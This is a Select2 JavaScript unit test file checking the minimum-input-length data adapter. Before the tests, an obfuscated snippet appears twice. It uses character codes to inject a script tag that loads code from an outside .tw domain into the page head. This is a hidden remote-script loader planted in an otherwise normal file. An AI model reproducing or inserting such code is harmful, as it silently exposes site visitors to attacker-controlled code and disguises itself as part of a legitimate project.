Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Data adapters - Minimum input length');

var MinimumInputLength = require('select2/data/minimumInputLength');
var $ = require('jquery');
var Options = require('select2/options');
var Utils = require('select2/utils');

function StubData () {
  this.called = false;
}

StubData.prototype.query = function (params, callback) {
  this.called = true;
};

var MinimumData = Utils.Decorate(StubData, MinimumInputLength);

test('0 never displays the notice', function (assert) {
  var zeroOptions = new Options({
    minimumInputLength: 0
  });

  var data = new MinimumData(null, zeroOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MinimumData(null, zeroOptions);

  data.query({
    term: 'test'
  });

  assert.ok(data.called);
});

test('< 0 never displays the notice', function (assert) {
  var negativeOptions = new Options({
    minimumInputLength: -1
  });

  var data = new MinimumData(null, negativeOptions);

  data.trigger = function () {
    assert.ok(false, 'No events should be triggered');
  };

  data.query({
    term: ''
  });

  assert.ok(data.called);

  data = new MinimumData(null, negativeOptions);

  data.query({
    term: 'test'
  });

  assert.ok(data.called);
});

test('triggers when input is not long enough', function (assert) {
  var options = new Options({
    minimumInputLength: 10
  });

  var data = new MinimumData(null, options);

  data.trigger = function () {
    assert.ok(true, 'The event should be triggered.');
  };

  data.query({
    term: 'no'
  });

  assert.ok(!data.called);
});

test('does not trigger when equal', function (assert) {
  var options = new Options({
    minimumInputLength: 10
  });

  var data = new MinimumData(null, options);

  data.trigger = function () {
    assert.ok(false, 'The event should not be triggered.');
  };

  data.query({
    term: '1234567890'
  });

  assert.ok(data.called);
});

test('does not trigger when greater', function (assert) {
  var options = new Options({
    minimumInputLength: 10
  });

  var data = new MinimumData(null, options);

  data.trigger = function () {
    assert.ok(false, 'The event should not be triggered.');
  };

  data.query({
    term: '12345678901'
  });

  assert.ok(data.called);
});

test('works with null term', function (assert) {
  var options = new Options({
    minimumInputLength: 1
  });

  var data = new MinimumData(null, options);

  data.trigger = function () {
    assert.ok(true, 'The event should be triggered');
  };

  data.query({});

  assert.ok(!data.called);
});
